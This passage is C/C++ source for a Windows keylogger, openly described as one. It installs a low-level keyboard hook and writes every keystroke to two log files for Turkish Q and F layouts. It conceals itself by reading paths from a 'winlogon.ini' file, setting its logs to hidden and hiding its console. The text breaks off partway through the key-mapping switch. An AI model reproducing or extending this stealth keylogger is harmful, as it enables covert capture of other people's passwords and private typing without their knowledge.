/*****************************************************************************/
/*****************************************************************************/
/* ABOUT */

/*
 * Portable keylogger.
 * Reads save location from .ini file.
 * It does not start itself. Needs to click/run if it has been terminated.
 */

/*****************************************************************************/
/*****************************************************************************/
/* PRAGMAS, DEFINITIONS AND HEADER FILES */

/*****************************************************************************/
#pragma once

/*****************************************************************************/

/*
 * Definition for blocking "safe code" warnings!
 * This function or variable may be unsafe. Consider using xxxxxx instead.
 * To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for
 * details.
 */

#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif // _MSC_VER

/*****************************************************************************/

/* Exclude rarely-used stuff from Windows headers. */

#define WIN32_LEAN_AND_MEAN

/*
 * If you need Win32 API features newer the Win95 and WinNT, then you must
 * define WINVER before including windows.h or any other method of including
 * the windef.h header.
 */

// Next two lines are same!
//#define _WIN32_WINNT 0x0500
#define WINVER 0x0500 /* Code works on Win(2k and successors) */

/*****************************************************************************/

#include <windows.h>
#include <VersionHelpers.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <tchar.h>
#include <time.h>
#include <string>

/*****************************************************************************/
/* C++ NAMESPACES */

using namespace std;

/*****************************************************************************/
/*****************************************************************************/
/* FUNCTION PROTOTYPES */

int fnAllFileStreamsCloser(void);
int fnIsCapslock(void);
//__declspec(dllexport) // for LRESULT CALLBACK fnKeyboardCallback
LRESULT CALLBACK fnKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI fnKeyboardHook(LPVOID lpParameter);
int fnKeyboardThreadInit(char* argv[]);
int fnKlogFileUp(void);
int fnNewLineTimer(void);
int fnNewLineTimerPrinter(void);
int fnStealthConsole(void);

/*****************************************************************************/
/*****************************************************************************/
/* GLOBAL VARIABLES */

/* VISIBLE = 0, logger hidden. VISIBLE = 1, logger is visible. */
const int VISIBLE = 0;

HHOOK hKeyHook; /* Global hook handle. */

/*****************************************************************************/
/*****************************************************************************/

int fnAllFileStreamsCloser(void)
{
    _fcloseall();

    return 0;
}

/*****************************************************************************/
/*****************************************************************************/

 /*
  * https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-getkeystate
  */

int fnIsCapslock(void)
{
    if((GetKeyState(VK_CAPITAL) & 0x0001) != 0) /* If capslock on... */
        return 1;
    else
        return 0;
}

/*****************************************************************************/
/*****************************************************************************/

LRESULT CALLBACK fnKeyboardCallback(int nCode,
    WPARAM wParam, LPARAM lParam)
{
    /* Prints datetime before keystrokes with 5sec time interval. */
    fnNewLineTimer();

    /*
     * This structure contains information about a low-level keyboard input
     * like virtual code, scan code, flags, time stamp and additional
     * information associated with the message.
     *
     * https://docs.microsoft.com/en-us/windows/desktop/api/winuser/ns-winuser-tagkbdllhookstruct
     */

    KBDLLHOOKSTRUCT *pKeyboard = (KBDLLHOOKSTRUCT *)lParam;

    /*************************************************************************/
    /*************************************************************************/
    /* Gets the rec path. Reads ini file. */
    LPCTSTR lpctstrIniPath = _T(".\\winlogon.ini");
    TCHAR tchQLogPathString[256];
    TCHAR tchFLogPathString[256];

    /* Passes ini files data to tchar array. */
    GetPrivateProfileString(_T("Q Log Record"), _T("Q_Path"), _T(""), tchQLogPathString, 256, lpctstrIniPath);
    GetPrivateProfileString(_T("F Log Record"), _T("F_Path"), _T(""), tchFLogPathString, 256, lpctstrIniPath);

    /* Q and F keyboard layouts (char array). */
    char szQKlogFilePath[MAX_PATH] = {""};
    char szFKlogFilePath[MAX_PATH] = {""};

    /* Converts tchar array to char array. */
    wcstombs(szQKlogFilePath, tchQLogPathString, wcslen(tchQLogPathString) + 1);
    wcstombs(szFKlogFilePath, tchFLogPathString, wcslen(tchFLogPathString) + 1);

    /* Opens Q keyboard layout file. */
    FILE *pTQLogFile;
    pTQLogFile = fopen(szQKlogFilePath, "a+");

    /* Opens F keyboard layout file. */
    FILE *pTFLogFile;
    pTFLogFile = fopen(szFKlogFilePath, "a+");

    /*************************************************************************/
    /* Sets log files file attributes. */

    /* Q */
    DWORD dwQKlogFileAttribute = GetFileAttributesA(szQKlogFilePath);
    if(dwQKlogFileAttribute != (FILE_ATTRIBUTE_HIDDEN))
        SetFileAttributesA(szQKlogFilePath,
            FILE_ATTRIBUTE_HIDDEN);
    /* F */
    DWORD dwFKlogFileAttribute = GetFileAttributesA(szFKlogFilePath);
    if(dwFKlogFileAttribute != (FILE_ATTRIBUTE_HIDDEN))
        SetFileAttributesA(szFKlogFilePath,
            FILE_ATTRIBUTE_HIDDEN);

    /*************************************************************************/
    /* Key switch. */

    switch(wParam)
    {
    case WM_KEYDOWN:
    {
        /*
         * When the key has been pressed.
         * Changed from WM_KEYUP to catch multiple strokes.
         */

        /* Assigns virtual key code to local variable. */
        DWORD vkCode = pKeyboard->vkCode;
        if(fnIsCapslock()) /* KEYDOWN + CAPS LOCK */
        {
            if((GetAsyncKeyState(VK_RSHIFT) ||
                GetAsyncKeyState(VK_LSHIFT))) /* KEYDOWN + CAPS LOCK + SHIFT */
            {
                switch(vkCode)
                {
                case 0x03: /* VK_CANCEL */
                    fputs("[0x03]", pTQLogFile);
                    fputs("[0x03]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x08: /* VK_BACK */
                    fputs("[Backspace]", pTQLogFile);
                    fputs("[Backspace]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x09: /* VK_TAB */
                    fputs("[Tab]", pTQLogFile);
                    fputs("[Tab]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x0D: /* VK_RETURN */
                    fputs("[Enter]\n", pTQLogFile);
                    fputs("[Enter]\n", pTFLogFile);
                    fnAllFileStreamsCloser();
                    fnNewLineTimerPrinter(); break;
                case 0x1B: /* VK_ESCAPE */
                    fputs("[Esc]", pTQLogFile);
                    fputs("[Esc]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x20: /* VK_SPACE */
                    fputs(" ", pTQLogFile);
                    fputs(" ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x30: /* VK_0 */
                    fputs("=", pTQLogFile);
                    fputs("=", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x31: /* VK_1 */
                    fputs("!", pTQLogFile);
                    fputs("!", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x32: /* VK_2 */
                    fputs("'", pTQLogFile);
                    fputs("\"", pTFLogFile);  /* Escape Seq. \" */
                    fnAllFileStreamsCloser(); break;
                case 0x33: /* VK_3 */
                    fputs("^", pTQLogFile);
                    fputs("^", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x34: /* VK_4 */
                    fputs("+", pTQLogFile);
                    fputs("$", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x35: /* VK_5 */
                    fputs("%", pTQLogFile);
                    fputs("%", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x36: /* VK_6 */
                    fputs("&", pTQLogFile);
                    fputs("&", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x37: /* VK_7 */
                    fputs("/", pTQLogFile);
                    fputs("'", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x38: /* VK_8 */
                    fputs("(", pTQLogFile);
                    fputs("(", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x39: /* VK_9 */
                    fputs(")", pTQLogFile);
                    fputs(")", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x41: /* VK_A */
                    fputs("a", pTQLogFile);
                    fputs("a", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x42: /* VK_B */
                    fputs("b", pTQLogFile);
                    fputs("b", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x43: /* VK_C */
                    fputs("c", pTQLogFile);
                    fputs("c", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x44: /* VK_D */
                    fputs("d", pTQLogFile);
                    fputs("d", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x45: /* VK_E */
                    fputs("e", pTQLogFile);
                    fputs("e", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x46: /* VK_F */
                    fputs("f", pTQLogFile);
                    fputs("f", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x47: /* VK_G */
                    fputs("g", pTQLogFile);
                    fputs("g", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x48: /* VK_H */
                    fputs("h", pTQLogFile);
                    fputs("h", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x49: /* VK_I */
                    fputs("ý", pTQLogFile);
                    fputs("ý", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4A: /* VK_J */
                    fputs("j", pTQLogFile);
                    fputs("j", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4B: /* VK_K */
                    fputs("k", pTQLogFile);
                    fputs("k", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4C: /* VK_L */
                    fputs("l", pTQLogFile);
                    fputs("l", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4D: /* VK_M */
                    fputs("m", pTQLogFile);
                    fputs("m", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4E: /* VK_N */
                    fputs("n", pTQLogFile);
                    fputs("n", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4F: /* VK_O */
                    fputs("o", pTQLogFile);
                    fputs("o", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x50: /* VK_P */
                    fputs("p", pTQLogFile);
                    fputs("p", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x51: /* VK_Q */
                    fputs("q", pTQLogFile);
                    fputs("q", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x52: /* VK_R */
                    fputs("r", pTQLogFile);
                    fputs("r", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x53: /* VK_S */
                    fputs("s", pTQLogFile);
                    fputs("s", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x54: /* VK_T */
                    fputs("t", pTQLogFile);
                    fputs("t", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x55: /* VK_U */
                    fputs("u", pTQLogFile);
                    fputs("u", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x56: /* VK_V */
                    fputs("v", pTQLogFile);
                    fputs("v", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x57: /* VK_W */
                    fputs("w", pTQLogFile);
                    fputs("w", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x58: /* VK_X */
                    fputs("x", pTQLogFile);
                    fputs("x", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x59: /* VK_Y */
                    fputs("y", pTQLogFile);
                    fputs("y", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x5A: /* VK_Z */
                    fputs("z", pTQLogFile);
                    fputs("z", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6A: /* VK_MULTIPLY */
                    fputs("*", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6B: /* VK_ADD */
                    fputs("+", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6D: /* VK_SUBTRACT */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6F: /* VK_DIVIDE */
                    fputs("/", pTQLogFile);
                    fputs("/", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBA: /* VK_OEM_1 */
                    fputs("þ", pTQLogFile);
                    fputs("ð", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBB: /* VK_OEM_PLUS */
                    //fputs("", pTQLogFile); /* Doesn't exists in TRQ. */
                    fputs("?", pTFLogFile); /* Only TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xBC: /* VK_OEM_COMMA */
                    fputs(";", pTQLogFile);
                    fputs(";", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBD: /* VK_OEM_MINUS */
                    fputs("_", pTQLogFile);
                    fputs("_", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBE: /* VK_OEM_PERIOD */
                    fputs(":", pTQLogFile);
                    fputs(":", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBF: /* VK_OEM_2 */
                    fputs("ö", pTQLogFile);
                    fputs("ç", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xC0: /* VK_OEM_3 */
                    fputs("é", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDB: /* VK_OEM_4 */
                    fputs("ð", pTQLogFile);
                    fputs("i", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDC: /* VK_OEM_5 */
                    fputs("ç", pTQLogFile);
                    fputs("ö", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDD: /* VK_OEM_6 */
                    fputs("ü", pTQLogFile);
                    fputs("ü", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDE: /* VK_OEM_7 */
                    fputs("i", pTQLogFile);
                    fputs("þ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDF: /* VK_OEM_8 */
                    fputs("?", pTQLogFile); /* Only TRQ. */
                    //fputs("?", pTFLogFile); /* Doesn't exists in TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xE2: /* VK_OEM_102 */
                    fputs(">", pTQLogFile);
                    fputs(">", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                }
            }
            else /* KEYDOWN + CAPS LOCK (NO SHIFT) */
            {
                switch(vkCode)
                {
                case 0x03: /* VK_CANCEL */
                    fputs("[0x03]", pTQLogFile);
                    fputs("[0x03]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x08: /* VK_BACK */
                    fputs("[Backspace]", pTQLogFile);
                    fputs("[Backspace]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x09: /* VK_TAB */
                    fputs("[Tab]", pTQLogFile);
                    fputs("[Tab]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x0D: /* VK_RETURN */
                    fputs("[Enter]\n", pTQLogFile);
                    fputs("[Enter]\n", pTFLogFile);
                    fnAllFileStreamsCloser();
                    fnNewLineTimerPrinter(); break;
                case 0x1B: /* VK_ESCAPE */
                    fputs("[Esc]", pTQLogFile);
                    fputs("[Esc]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x20: /* VK_SPACE */
                    fputs(" ", pTQLogFile);
                    fputs(" ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x30: /* VK_0 */
                    fputs("0", pTQLogFile);
                    fputs("0", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x31: /* VK_1 */
                    fputs("1", pTQLogFile);
                    fputs("1", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x32: /* VK_2 */
                    fputs("2", pTQLogFile);
                    fputs("2", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x33: /* VK_3 */
                    fputs("3", pTQLogFile);
                    fputs("3", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x34: /* VK_4 */
                    fputs("4", pTQLogFile);
                    fputs("4", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x35: /* VK_5 */
                    fputs("5", pTQLogFile);
                    fputs("5", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x36: /* VK_6 */
                    fputs("6", pTQLogFile);
                    fputs("6", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x37: /* VK_7 */
                    fputs("7", pTQLogFile);
                    fputs("7", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x38: /* VK_8 */
                    fputs("8", pTQLogFile);
                    fputs("8", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x39: /* VK_9 */
                    fputs("9", pTQLogFile);
                    fputs("9", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x41: /* VK_A */
                    fputs("A", pTQLogFile);
                    fputs("A", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x42: /* VK_B */
                    fputs("B", pTQLogFile);
                    fputs("B", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x43: /* VK_C */
                    fputs("C", pTQLogFile);
                    fputs("C", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x44: /* VK_D */
                    fputs("D", pTQLogFile);
                    fputs("D", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x45: /* VK_E */
                    fputs("E", pTQLogFile);
                    fputs("E", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x46: /* VK_F */
                    fputs("F", pTQLogFile);
                    fputs("F", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x47: /* VK_G */
                    fputs("G", pTQLogFile);
                    fputs("G", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x48: /* VK_H */
                    fputs("H", pTQLogFile);
                    fputs("H", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x49: /* VK_I */
                    fputs("I", pTQLogFile);
                    fputs("I", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4A: /* VK_J */
                    fputs("J", pTQLogFile);
                    fputs("J", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4B: /* VK_K */
                    fputs("K", pTQLogFile);
                    fputs("K", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4C: /* VK_L */
                    fputs("L", pTQLogFile);
                    fputs("L", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4D: /* VK_M */
                    fputs("M", pTQLogFile);
                    fputs("M", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4E: /* VK_N */
                    fputs("N", pTQLogFile);
                    fputs("N", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4F: /* VK_O */
                    fputs("O", pTQLogFile);
                    fputs("O", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x50: /* VK_P */
                    fputs("P", pTQLogFile);
                    fputs("P", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x51: /* VK_Q */
                    fputs("Q", pTQLogFile);
                    fputs("Q", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x52: /* VK_R */
                    fputs("R", pTQLogFile);
                    fputs("R", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x53: /* VK_S */
                    fputs("S", pTQLogFile);
                    fputs("S", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x54: /* VK_T */
                    fputs("T", pTQLogFile);
                    fputs("T", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x55: /* VK_U */
                    fputs("U", pTQLogFile);
                    fputs("U", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x56: /* VK_V */
                    fputs("V", pTQLogFile);
                    fputs("V", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x57: /* VK_W */
                    fputs("W", pTQLogFile);
                    fputs("W", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x58: /* VK_X */
                    fputs("X", pTQLogFile);
                    fputs("X", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x59: /* VK_Y */
                    fputs("Y", pTQLogFile);
                    fputs("Y", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x5A: /* VK_Z */
                    fputs("Z", pTQLogFile);
                    fputs("Z", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6A: /* VK_MULTIPLY */
                    fputs("*", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6B: /* VK_ADD */
                    fputs("+", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6D: /* VK_SUBTRACT */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6F: /* VK_DIVIDE */
                    fputs("/", pTQLogFile);
                    fputs("/", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBA: /* VK_OEM_1 */
                    fputs("Þ", pTQLogFile);
                    fputs("Ð", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBB: /* VK_OEM_PLUS */
                    //fputs("", pTQLogFile); /* Doesn't exists in TRQ. */
                    fputs("/", pTFLogFile); /* Only TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xBC: /* VK_OEM_COMMA */
                    fputs(",", pTQLogFile);
                    fputs(",", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBD: /* VK_OEM_MINUS */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBE: /* VK_OEM_PERIOD */
                    fputs(".", pTQLogFile);
                    fputs(".", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBF: /* VK_OEM_2 */
                    fputs("Ö", pTQLogFile);
                    fputs("Ç", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xC0: /* VK_OEM_3 */
                    fputs("\"", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDB: /* VK_OEM_4 */
                    fputs("Ð", pTQLogFile);
                    fputs("Ý", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDC: /* VK_OEM_5 */
                    fputs("Ç", pTQLogFile);
                    fputs("Ö", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDD: /* VK_OEM_6 */
                    fputs("Ü", pTQLogFile);
                    fputs("Ü", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDE: /* VK_OEM_7 */
                    fputs("Ý", pTQLogFile);
                    fputs("Þ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xDF: /* VK_OEM_8 */
                    fputs("*", pTQLogFile); /* Only TRQ. */
                    //fputs("*", pTFLogFile); /* Doesn't exists in TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xE2: /* VK_OEM_102 */
                    fputs("<", pTQLogFile);
                    fputs("<", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                }
            }
        }
        else /* KEYDOWN (NO CAPS LOCK) */
        {
            /* KEYDOWN (NO CAPS LOCK) + SHIFT */
            if((GetAsyncKeyState(VK_RSHIFT) ||
                GetAsyncKeyState(VK_LSHIFT)))
            {
                switch(vkCode)
                {
                case 0x03: /* VK_CANCEL */
                    fputs("[0x03]", pTQLogFile);
                    fputs("[0x03]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x08: /* VK_BACK */
                    fputs("[Backspace]", pTQLogFile);
                    fputs("[Backspace]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x09: /* VK_TAB */
                    fputs("[Tab]", pTQLogFile);
                    fputs("[Tab]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x0D: /* VK_RETURN */
                    fputs("[Enter]\n", pTQLogFile);
                    fputs("[Enter]\n", pTFLogFile);
                    fnAllFileStreamsCloser();
                    fnNewLineTimerPrinter(); break;
                case 0x1B: /* VK_ESCAPE */
                    fputs("[Esc]", pTQLogFile);
                    fputs("[Esc]", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x20: /* VK_SPACE */
                    fputs(" ", pTQLogFile);
                    fputs(" ", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x30: /* VK_0 */
                    fputs("=", pTQLogFile);
                    fputs("=", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x31: /* VK_1 */
                    fputs("!", pTQLogFile);
                    fputs("!", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x32: /* VK_2 */
                    fputs("'", pTQLogFile);
                    fputs("\"", pTFLogFile); /* Escape Seq. \" */
                    fnAllFileStreamsCloser(); break;
                case 0x33: /* VK_3 */
                    fputs("^", pTQLogFile);
                    fputs("^", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x34: /* VK_4 */
                    fputs("+", pTQLogFile);
                    fputs("$", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x35: /* VK_5 */
                    fputs("%", pTQLogFile);
                    fputs("%", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x36: /* VK_6 */
                    fputs("&", pTQLogFile);
                    fputs("&", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x37: /* VK_7 */
                    fputs("/", pTQLogFile);
                    fputs("'", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x38: /* VK_8 */
                    fputs("(", pTQLogFile);
                    fputs("(", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x39: /* VK_9 */
                    fputs(")", pTQLogFile);
                    fputs(")", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x41: /* VK_A */
                    fputs("A", pTQLogFile);
                    fputs("A", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x42: /* VK_B */
                    fputs("B", pTQLogFile);
                    fputs("B", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x43: /* VK_C */
                    fputs("C", pTQLogFile);
                    fputs("C", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x44: /* VK_D */
                    fputs("D", pTQLogFile);
                    fputs("D", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x45: /* VK_E */
                    fputs("E", pTQLogFile);
                    fputs("E", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x46: /* VK_F */
                    fputs("F", pTQLogFile);
                    fputs("F", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x47: /* VK_G */
                    fputs("G", pTQLogFile);
                    fputs("G", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x48: /* VK_H */
                    fputs("H", pTQLogFile);
                    fputs("H", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x49: /* VK_I */
                    fputs("I", pTQLogFile);
                    fputs("I", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4A: /* VK_J */
                    fputs("J", pTQLogFile);
                    fputs("J", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4B: /* VK_K */
                    fputs("K", pTQLogFile);
                    fputs("K", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4C: /* VK_L */
                    fputs("L", pTQLogFile);
                    fputs("L", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4D: /* VK_M */
                    fputs("M", pTQLogFile);
                    fputs("M", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4E: /* VK_N */
                    fputs("N", pTQLogFile);
                    fputs("N", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x4F: /* VK_O */
                    fputs("O", pTQLogFile);
                    fputs("O", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x50: /* VK_P */
                    fputs("P", pTQLogFile);
                    fputs("P", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x51: /* VK_Q */
                    fputs("Q", pTQLogFile);
                    fputs("Q", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x52: /* VK_R */
                    fputs("R", pTQLogFile);
                    fputs("R", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x53: /* VK_S */
                    fputs("S", pTQLogFile);
                    fputs("S", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x54: /* VK_T */
                    fputs("T", pTQLogFile);
                    fputs("T", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x55: /* VK_U */
                    fputs("U", pTQLogFile);
                    fputs("U", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x56: /* VK_V */
                    fputs("V", pTQLogFile);
                    fputs("V", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x57: /* VK_W */
                    fputs("W", pTQLogFile);
                    fputs("W", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x58: /* VK_X */
                    fputs("X", pTQLogFile);
                    fputs("X", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x59: /* VK_Y */
                    fputs("Y", pTQLogFile);
                    fputs("Y", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x5A: /* VK_Z */
                    fputs("Z", pTQLogFile);
                    fputs("Z", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6A: /* VK_MULTIPLY */
                    fputs("*", pTQLogFile);
                    fputs("*", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6B: /* VK_ADD */
                    fputs("+", pTQLogFile);
                    fputs("+", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6D: /* VK_SUBTRACT */
                    fputs("-", pTQLogFile);
                    fputs("-", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0x6F: /* VK_DIVIDE */
                    fputs("/", pTQLogFile);
                    fputs("/", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBA: /* VK_OEM_1 */
                    fputs("Þ", pTQLogFile);
                    fputs("Ð", pTFLogFile);
                    fnAllFileStreamsCloser(); break;
                case 0xBB: /* VK_OEM_PLUS */
                    //fputs("", pTQLogFile); /* Doesn't exists in TRQ. */
                    fputs("?", pTFLogFile); /* Only TRF. */
                    fnAllFileStreamsCloser(); break;
                case 0xBC: /* VK_OEM_COMMA */
